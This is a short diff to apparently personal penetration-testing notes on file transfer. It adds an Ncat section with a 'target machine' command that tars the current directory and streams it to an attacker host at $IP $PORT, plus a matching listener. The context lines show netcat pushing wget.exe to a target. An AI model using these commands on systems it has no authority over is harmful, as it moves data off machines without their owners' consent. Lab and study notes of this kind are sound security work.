@@ -17,6 +17,17 @@ nc -lvnp $PORT > tranfered.exe
 nc -nv $IP $PORT < /usr/share/windows-resources/binaries/wget.exe
 ```
 
+## Ncat
+
+Target machine
+```bash
+tar cf - . | ncat $IP $PORT
+```
+Attack machine
+```bash
+ncat -nlvp $PORT | tar xf -
+```
+
 ## Socat
 Use [[Socat-Cheatsheet]], Host with:
 ```bash
